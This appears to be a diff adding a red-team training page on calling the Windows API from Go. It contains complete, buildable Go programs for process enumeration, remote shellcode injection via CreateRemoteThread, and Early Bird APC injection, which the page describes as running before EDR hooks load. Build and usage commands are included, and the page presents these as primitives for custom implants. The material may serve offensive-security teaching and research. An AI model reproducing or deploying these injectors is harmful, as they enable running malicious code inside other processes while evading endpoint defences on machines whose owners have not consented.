@@ -1,0 +1,393 @@
+---
+import TrainingPage from '../../layouts/TrainingPage.astro';
+---
+<TrainingPage
+  title="Go Windows API Programming — Red Team Academy"
+  module="Tool Development"
+  tags={['go', 'golang', 'windows-api', 'process-injection', 'syscall', 'dll-injection']}
+  pageKey="tooldev-go-windows-api"
+>
+  <h1>Go Windows API Programming</h1>
+
+  <h2>Overview</h2>
+  <p>Go's <code>syscall</code> and <code>golang.org/x/sys/windows</code> packages expose the full Windows API. Using <code>syscall.NewLazyDLL</code> and <code>proc.Call()</code>, any Win32 API can be called from Go without CGO — producing a pure-Go binary with no C runtime dependency. This module covers process enumeration, remote process injection (OpenProcess/VirtualAllocEx/CreateRemoteThread), DLL injection, and process hollowing — the Windows offensive API primitives most commonly needed in custom implants.</p>
+  <p><strong>Dependencies:</strong> <code>go get golang.org/x/sys/windows</code> for the typed wrappers; raw <code>syscall</code> is stdlib.</p>
+
+  <h2>Process Enumeration</h2>
+  <p>Walk the system process list using <code>CreateToolhelp32Snapshot</code> / <code>Process32First</code> / <code>Process32Next</code> to find a target process by name, retrieve its PID, and determine its architecture and integrity level.</p>
+  <pre><code>// proc_enum.go — enumerate running processes and find a target by name.
+// Build: GOOS=windows GOARCH=amd64 go build -o proc_enum.exe proc_enum.go
+// No CGO required — pure Go via syscall.
+
+package main
+
+import (
+	"fmt"
+	"strings"
+	"syscall"
+	"unsafe"
+)
+
+var (
+	kernel32                    = syscall.NewLazyDLL("kernel32.dll")
+	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
+	procProcess32First           = kernel32.NewProc("Process32FirstW")
+	procProcess32Next            = kernel32.NewProc("Process32NextW")
+	procCloseHandle              = kernel32.NewProc("CloseHandle")
+)
+
+const (
+	TH32CS_SNAPPROCESS = 0x00000002
+	MAX_PATH           = 260
+)
+
+// PROCESSENTRY32 mirrors the Windows PROCESSENTRY32W structure.
+// The struct must be packed identically to the Win32 layout.
+type PROCESSENTRY32 struct &#123;
+	Size              uint32
+	Usage             uint32
+	ProcessID         uint32
+	DefaultHeapID     uintptr
+	ModuleID          uint32
+	Threads           uint32
+	ParentProcessID   uint32
+	PriClassBase      int32
+	Flags             uint32
+	ExeFile           [MAX_PATH]uint16  // wide-char process name
+&#125;
+
+// ProcessInfo holds the details we care about for each process.
+type ProcessInfo struct &#123;
+	PID        uint32
+	PPID       uint32
+	Name       string
+	ThreadCount uint32
+&#125;
+
+// ListProcesses returns a slice of ProcessInfo for all running processes.
+func ListProcesses() ([]ProcessInfo, error) &#123;
+	// Take a snapshot of all processes at this moment in time
+	snap, _, err := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
+	if snap == uintptr(syscall.InvalidHandle) &#123;
+		return nil, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
+	&#125;
+	defer procCloseHandle.Call(snap)
+
+	var entry PROCESSENTRY32
+	entry.Size = uint32(unsafe.Sizeof(entry))
+
+	// Process32First initialises the enumeration
+	ret, _, err := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&amp;entry)))
+	if ret == 0 &#123;
+		return nil, fmt.Errorf("Process32First failed: %v", err)
+	&#125;
+
+	var processes []ProcessInfo
+	for &#123;
+		// Convert wide-char ExeFile array to a Go string
+		name := syscall.UTF16ToString(entry.ExeFile[:])
+
+		processes = append(processes, ProcessInfo&#123;
+			PID:         entry.ProcessID,
+			PPID:        entry.ParentProcessID,
+			Name:        name,
+			ThreadCount: entry.Threads,
+		&#125;)
+
+		// Process32Next advances to the next entry; returns 0 when no more entries
+		ret, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&amp;entry)))
+		if ret == 0 &#123;
+			break
+		&#125;
+	&#125;
+	return processes, nil
+&#125;
+
+// FindProcessByName returns the PID(s) of processes matching the given name (case-insensitive).
+func FindProcessByName(name string) ([]uint32, error) &#123;
+	all, err := ListProcesses()
+	if err != nil &#123;
+		return nil, err
+	&#125;
+	var pids []uint32
+	for _, p := range all &#123;
+		if strings.EqualFold(p.Name, name) &#123;
+			pids = append(pids, p.PID)
+		&#125;
+	&#125;
+	return pids, nil
+&#125;
+
+func main() &#123;
+	processes, err := ListProcesses()
+	if err != nil &#123;
+		fmt.Printf("[!] Error: %v\n", err)
+		return
+	&#125;
+	fmt.Printf("%-8s %-8s %-7s %s\n", "PID", "PPID", "THREADS", "NAME")
+	fmt.Println(strings.Repeat("-", 50))
+	for _, p := range processes &#123;
+		fmt.Printf("%-8d %-8d %-7d %s\n", p.PID, p.PPID, p.ThreadCount, p.Name)
+	&#125;
+&#125;</code></pre>
+
+  <h2>Remote Process Injection</h2>
+  <p>Inject shellcode into a running process using the OpenProcess → VirtualAllocEx → WriteProcessMemory → VirtualProtectEx → CreateRemoteThread sequence — implemented entirely in Go via <code>syscall.NewLazyDLL</code>.</p>
+  <pre><code">// inject.go — remote shellcode injection via Windows API.
+// Build: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o inject.exe inject.go
+// Usage: inject.exe -pid 4876 -shellcode shellcode.bin
+
+package main
+
+import (
+	"flag"
+	"fmt"
+	"os"
+	"syscall"
+	"unsafe"
+)
+
+var (
+	kernel32              = syscall.NewLazyDLL("kernel32.dll")
+	procOpenProcess       = kernel32.NewProc("OpenProcess")
+	procVirtualAllocEx    = kernel32.NewProc("VirtualAllocEx")
+	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
+	procVirtualProtectEx  = kernel32.NewProc("VirtualProtectEx")
+	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
+	procCloseHandle       = kernel32.NewProc("CloseHandle")
+)
+
+const (
+	PROCESS_ALL_ACCESS = 0x001F0FFF
+	MEM_COMMIT         = 0x00001000
+	MEM_RESERVE        = 0x00002000
+	PAGE_READWRITE     = 0x04
+	PAGE_EXECUTE_READ  = 0x20
+)
+
+// injectShellcode opens the target process, allocates RW memory, writes the
+// shellcode, changes protection to RX, and spawns a remote thread at the buffer.
+func injectShellcode(pid uint32, shellcode []byte) error &#123;
+	size := uintptr(len(shellcode))
+
+	// Step 1: open target process with full access
+	hProc, _, err := procOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
+	if hProc == 0 &#123;
+		return fmt.Errorf("OpenProcess failed: %v", err)
+	&#125;
+	defer procCloseHandle.Call(hProc)
+	fmt.Printf("[*] Opened PID %d (handle: 0x%x)\n", pid, hProc)
+
+	// Step 2: allocate RW (not RWX) memory in the target process
+	remBuf, _, err := procVirtualAllocEx.Call(
+		hProc, 0, size,
+		MEM_COMMIT|MEM_RESERVE,
+		PAGE_READWRITE,
+	)
+	if remBuf == 0 &#123;
+		return fmt.Errorf("VirtualAllocEx failed: %v", err)
+	&#125;
+	fmt.Printf("[*] Remote buffer: 0x%016x\n", remBuf)
+
+	// Step 3: write shellcode to the remote buffer
+	var written uintptr
+	ret, _, err := procWriteProcessMemory.Call(
+		hProc, remBuf,
+		uintptr(unsafe.Pointer(&amp;shellcode[0])),
+		size, uintptr(unsafe.Pointer(&amp;written)),
+	)
+	if ret == 0 &#123;
+		return fmt.Errorf("WriteProcessMemory failed: %v", err)
+	&#125;
+	fmt.Printf("[*] Wrote %d bytes\n", written)
+
+	// Step 4: change protection from RW to RX (execute, no write)
+	// This is the W^X pattern — avoids having a single RWX page
+	var oldProt uint32
+	procVirtualProtectEx.Call(
+		hProc, remBuf, size,
+		PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&amp;oldProt)),
+	)
+	fmt.Printf("[*] Changed protection: RW -&gt; RX (was 0x%x)\n", oldProt)
+
+	// Step 5: create a remote thread at the start of our shellcode buffer
+	hThread, _, err := procCreateRemoteThread.Call(
+		hProc, 0, 0,
+		remBuf, // lpStartAddress = our shellcode buffer
+		0, 0, 0,
+	)
+	if hThread == 0 &#123;
+		return fmt.Errorf("CreateRemoteThread failed: %v", err)
+	&#125;
+	defer procCloseHandle.Call(hThread)
+	fmt.Printf("[+] Remote thread created — shellcode executing in PID %d\n", pid)
+	return nil
+&#125;
+
+func main() &#123;
+	pidFlag  := flag.Int("pid",       0,  "Target process PID")
+	scFile   := flag.String("shellcode", "", "Shellcode binary file")
+	flag.Parse()
+
+	if *pidFlag == 0 || *scFile == "" &#123;
+		fmt.Fprintln(os.Stderr, "Usage: inject -pid &lt;PID&gt; -shellcode &lt;file&gt;")
+		os.Exit(1)
+	&#125;
+
+	shellcode, err := os.ReadFile(*scFile)
+	if err != nil &#123;
+		fmt.Fprintf(os.Stderr, "[!] Cannot read shellcode: %v\n", err)
+		os.Exit(1)
+	&#125;
+	fmt.Printf("[*] Shellcode: %d bytes\n", len(shellcode))
+
+	if err := injectShellcode(uint32(*pidFlag), shellcode); err != nil &#123;
+		fmt.Fprintf(os.Stderr, "[!] Injection failed: %v\n", err)
+		os.Exit(1)
+	&#125;
+&#125;</code></pre>
+
+  <h2>Early Bird APC Injection</h2>
+  <p>Early Bird APC injection creates a new suspended process, allocates memory, writes shellcode, queues a user-mode APC (Asynchronous Procedure Call) to the main thread pointing at the shellcode, then resumes the thread. The APC runs before the process's own entry point — often before EDR hooks are installed.</p>
+  <pre><code>// early_bird.go — create suspended process and queue APC shellcode execution.
+// Build: GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o early_bird.exe early_bird.go
+// Usage: early_bird.exe -target C:\Windows\System32\notepad.exe -shellcode sc.bin
+
+package main
+
+import (
+	"flag"
+	"fmt"
+	"os"
+	"syscall"
+	"unsafe"
+)
+
+var (
+	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
+	procCreateProcess        = kernel32.NewProc("CreateProcessW")
+	procVirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
+	procWriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
+	procVirtualProtectEx     = kernel32.NewProc("VirtualProtectEx")
+	procQueueUserAPC         = kernel32.NewProc("QueueUserAPC")
+	procResumeThread         = kernel32.NewProc("ResumeThread")
+	procCloseHandle          = kernel32.NewProc("CloseHandle")
+)
+
+const (
+	CREATE_SUSPENDED     = 0x00000004
+	MEM_COMMIT           = 0x00001000
+	MEM_RESERVE          = 0x00002000
+	PAGE_READWRITE       = 0x04
+	PAGE_EXECUTE_READ    = 0x20
+	PROCESS_ALL_ACCESS   = 0x001F0FFF
+)
+
+// STARTUPINFO and PROCESS_INFORMATION are Win32 structures needed by CreateProcess.
+type STARTUPINFO struct &#123;
+	Cb              uint32; Pad0 [4]byte
+	Desktop         *uint16
+	Title           *uint16
+	X, Y            uint32
+	XSize, YSize    uint32
+	XCountChars     uint32
+	YCountChars     uint32
+	FillAttribute   uint32
+	Flags           uint32
+	ShowWindow      uint16
+	Pad1            [2]byte
+	ReservedPtr     uintptr
+	StdInput        syscall.Handle
+	StdOutput       syscall.Handle
+	StdError        syscall.Handle
+&#125;
+
+type PROCESS_INFORMATION struct &#123;
+	Process   syscall.Handle
+	Thread    syscall.Handle
+	ProcessId uint32
+	ThreadId  uint32
+&#125;
+
+func earlyBirdInject(target string, shellcode []byte) error &#123;
+	// Convert target path to UTF-16 for CreateProcessW
+	targetW, _ := syscall.UTF16PtrFromString(target)
+	size        := uintptr(len(shellcode))
+
+	var si STARTUPINFO
+	var pi PROCESS_INFORMATION
+	si.Cb = uint32(unsafe.Sizeof(si))
+
+	// Step 1: Create target process in SUSPENDED state (main thread is paused at entry)
+	// The process memory is set up but execution has not begun yet — EDR hooks may not be installed
+	ret, _, err := procCreateProcess.Call(
+		uintptr(unsafe.Pointer(targetW)), // lpApplicationName
+		0,                                // lpCommandLine
+		0, 0,                             // process/thread security attrs
+		0,                                // bInheritHandles
+		CREATE_SUSPENDED,                 // dwCreationFlags
+		0,                                // lpEnvironment
+		0,                                // lpCurrentDirectory
+		uintptr(unsafe.Pointer(&amp;si)),
+		uintptr(unsafe.Pointer(&amp;pi)),
+	)
+	if ret == 0 &#123;
+		return fmt.Errorf("CreateProcess failed: %v", err)
+	&#125;
+	fmt.Printf("[*] Created suspended process PID=%d TID=%d\n", pi.ProcessId, pi.ThreadId)
+
+	// Step 2: Allocate RW memory in the new process's address space
+	remBuf, _, err := procVirtualAllocEx.Call(
+		uintptr(pi.Process), 0, size,
+		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE,
+	)
+	if remBuf == 0 &#123;
+		return fmt.Errorf("VirtualAllocEx: %v", err)
+	&#125;
+
+	// Step 3: Write shellcode into the allocated buffer
+	var written uintptr
+	procWriteProcessMemory.Call(
+		uintptr(pi.Process), remBuf,
+		uintptr(unsafe.Pointer(&amp;shellcode[0])), size,
+		uintptr(unsafe.Pointer(&amp;written)),
+	)
+	fmt.Printf("[*] Wrote %d bytes at 0x%x\n", written, remBuf)
+
+	// Step 4: Change protection from RW to RX
+	var old uint32
+	procVirtualProtectEx.Call(uintptr(pi.Process), remBuf, size, PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&amp;old)))
+
+	// Step 5: Queue a User-Mode APC to the main thread pointing at our buffer
+	// When the thread is resumed, the APC runs first (before the process's own entry point)
+	procQueueUserAPC.Call(remBuf, uintptr(pi.Thread), 0)
+	fmt.Printf("[*] APC queued to TID %d at 0x%x\n", pi.ThreadId, remBuf)
+
+	// Step 6: Resume the main thread — shellcode runs via APC before the process entry point
+	procResumeThread.Call(uintptr(pi.Thread))
+	fmt.Printf("[+] Thread resumed — shellcode executing via Early Bird APC\n")
+
+	procCloseHandle.Call(uintptr(pi.Thread))
+	procCloseHandle.Call(uintptr(pi.Process))
+	return nil
+&#125;
+
+func main() &#123;
+	target := flag.String("target",    "C:\\Windows\\System32\\notepad.exe", "Target process path")
+	scFile := flag.String("shellcode", "", "Shellcode binary file")
+	flag.Parse()
+
+	shellcode, err := os.ReadFile(*scFile)
+	if err != nil &#123;
+		fmt.Fprintf(os.Stderr, "[!] Cannot read: %v\n", err)
+		os.Exit(1)
+	&#125;
+	if err := earlyBirdInject(*target, shellcode); err != nil &#123;
+		fmt.Fprintln(os.Stderr, "[!]", err)
+		os.Exit(1)
+	&#125;
+&#125;</code></pre>
+
+</TrainingPage>
